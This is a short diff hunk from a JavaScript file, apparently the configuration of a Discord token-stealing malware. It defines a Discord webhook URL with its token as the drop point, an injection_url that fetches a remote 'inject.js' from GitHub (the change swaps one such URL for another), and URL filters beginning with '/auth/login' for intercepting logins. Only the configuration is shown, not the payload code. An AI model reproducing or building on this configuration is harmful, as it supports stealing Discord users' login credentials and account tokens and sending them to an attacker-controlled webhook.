@@ -13,7 +13,7 @@ const {
 
 const CONFIG = {
     webhook: "https://discord.com/api/webhooks/1400181802936832131/4m7mEle9gDibLOVWNkFVy6_gF0Ta2m0k_6P3M9ptGmpNRWRHu6QQOKGr32YrrkQLr1KH",
-    injection_url: "https://raw.githubusercontent.com/lotusknig/lotus-knight.github.io/refs/heads/main/injection.js",
+    injection_url: "https://raw.githubusercontent.com/tabo1337/plague/refs/heads/main/inject.js",
     filters: {
         urls: [
             '/auth/login',
